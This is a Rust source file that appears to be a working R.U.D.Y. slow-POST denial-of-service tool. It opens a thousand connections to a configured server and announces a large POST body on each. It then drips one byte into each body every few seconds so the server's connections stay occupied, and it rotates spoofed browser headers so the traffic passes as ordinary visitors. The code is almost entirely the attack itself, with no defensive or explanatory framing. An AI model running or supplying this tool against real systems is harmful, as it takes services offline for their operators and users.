use std::fmt::format;
use std::io::Write;
use std::net::*;
use std::string::ToString;
use std::thread;
use std::time::Duration;

const IP_ADDRESS: &str = "127.0.0.1:8080";
const SOCKET_COUNT: u32 = 1000;
const CONTENT_LENGTH: &str = "10000";
const PATH: &str = "/";
const BYTES_PER_ROUND: u32 = 1;

fn main() {
    println!(r"
     ____     __  __   ____  _________    ____     __  _________________
    / __ \   / / / /  / __ \/ ____/   |  / __ \    \ \/ / ____/_  __/__ \
   / /_/ /  / / / /  / / / / __/ / /| | / / / /     \  / __/   / /   / _/
  / _, _/  / /_/ /  / /_/ / /___/ ___ |/ /_/ /      / / /___  / /   /_/
 /_/ |_|   \____/  /_____/_____/_/  |_/_____/      /_/_____/ /_/   (_)
                                                                        ");

    let content_type_header: &str = "Content-Type: application/x-www-form-urlencoded";
    let content_length_header: String = "Content-Length: ".to_string() + CONTENT_LENGTH;

    let host_header: String = "Host: ".to_string() + IP_ADDRESS;

    let mut vec_of_sockets = Vec::new();
    for i in 0..SOCKET_COUNT {
        let mut stream = socket_init();
        let header_vec = init_headers(content_type_header, &content_length_header, &host_header);
        let http_req = generate_http_req("POST", PATH, header_vec, "HTTP/1.1");
        stream.write_all(http_req.as_bytes()).expect("write fail");
        vec_of_sockets.push(stream);
    }
    loop {
        println!("Sending byte in HTTP POST body... Socket count: {}",vec_of_sockets.len());
        for s in vec_of_sockets.iter_mut() {
            let mut msg = "".to_string();
            for i  in 0..BYTES_PER_ROUND {
                msg.push("a".parse().unwrap());
            }
            s.write(msg.as_bytes()).expect("write fail");
        }
        thread::sleep(Duration::from_secs(5));
    }
}

fn init_headers<'a>(content_type_header: &'a str, content_length_header: &'a String, host_header: &'a String) -> Vec<&'a str> {
    let user_agents = vec![
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
        "User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
        "User-Agent: Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
        "User-Agent: Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
        "User-Agent: Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
        "User-Agent: Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:69.2.1) Gecko/20100101 Firefox/69.2",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.66.18) Gecko/20177177 Firefox/45.66.18",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0",
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
        "User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "User-Agent: Mozilla/5.0 (X11; Linux ppc64le; rv:75.0) Gecko/20100101 Firefox/75.0",
        "User-Agent: Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0",
        "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0",
        "User-Agent: Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu i686; rv:52.0) Gecko/20100101 Firefox/52.0",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
        "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
        "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
        "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
        "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
        "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
        "User-Agent: Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
        "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
        "User-Agent: Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
        "User-Agent: Mozilla/5.0 (Linux; Android 4.2.1; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
        "User-Agent: Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
        "User-Agent: Mozilla/5.0 (Android; Tablet; rv:18.0) Gecko/18.0 Firefox/18.0"
    ];

    let accept_header_list = vec![
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,image/jxr,*/*"
    ];

    let accept_enc_list = vec![
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Encoding: gzip",
        "Accept-Encoding: gzip",
        "Accept-Encoding: gzip",
        "Accept-Encoding: gzip, compress, br",
        "Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept-Encoding: gzip,deflate,sdch",
        "Accept-Encoding: *"
    ];

    let accept_lan_list = vec![
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: en-US,en,q=0.5",
        "Accept-Language: zh-CN,zh;q=0.8",
        "Accept-Language: zh-CN,zh;q=0.8",
        "Accept-Language: zh-CN,zh;q=0.8",
        "Accept-Language: zh-CN,zh;q=0.8",
        "Accept-Language: zh-CN,zh;q=0.8",
        "Accept-Language: zh-CN,zh;q=0.8",
        "Accept-Language: zh-CN,zh;q=0.8",
        "Accept-Language: zh-CN,zh;q=0.8",
        "Accept-Language: pt-BR,pt,q=0.5",
        "Accept-Language: pt-BR,pt,q=0.5",
        "Accept-Language: pt-BR,pt,q=0.5",
        "Accept-Language: pt-BR,pt,q=0.5",
        "Accept-Language: es-MX,es,q=0.5",
        "Accept-Language: es-MX,es,q=0.5",
        "Accept-Language: es-MX,es,q=0.5"
    ];

    let mut header_vec: Vec<&str> = Vec::new();
    header_vec.push(&*host_header);
    header_vec.push(&*user_agents[rand::random::<usize>() % user_agents.len()]);
    header_vec.push(&*accept_header_list[rand::random::<usize>() % accept_header_list.len()]);
    header_vec.push(&*accept_enc_list[rand::random::<usize>() % accept_enc_list.len()]);
    header_vec.push(&*accept_lan_list[rand::random::<usize>() % accept_lan_list.len()]);
    header_vec.push("Connection: keep-alive");
    header_vec.push("Cache-Control: max-age=0");
    header_vec.push(content_type_header);
    header_vec.push(&*content_length_header);
    header_vec
}

fn generate_http_req(method: &str, path: &str, headers: Vec<&str>, version: &str) -> String {
    let mut http_req = format!("{} {} {}\r\n", method, path, version);
    for head in headers {
        http_req += head;
        http_req += "\r\n";
    }
    http_req
}

fn socket_init() -> TcpStream {
    let parts: Vec<&str> = IP_ADDRESS.split(':').collect();
    let ip = parts[0];
    let port: u16 = parts[1].parse().expect("Invalid port number");
    //ip 생성
    let ip_addr: IpAddr = ip.parse().expect("Invalid IP address");
    let socket_addr = SocketAddr::new(ip_addr, port);

    let stream = TcpStream::connect(socket_addr).expect("connect fail");
    let timeout = Option::from(Duration::from_secs(10));
    stream.set_write_timeout(timeout).expect("TODO: panic message");
    stream.set_read_timeout(timeout).expect("TODO: panic message");
    stream
}
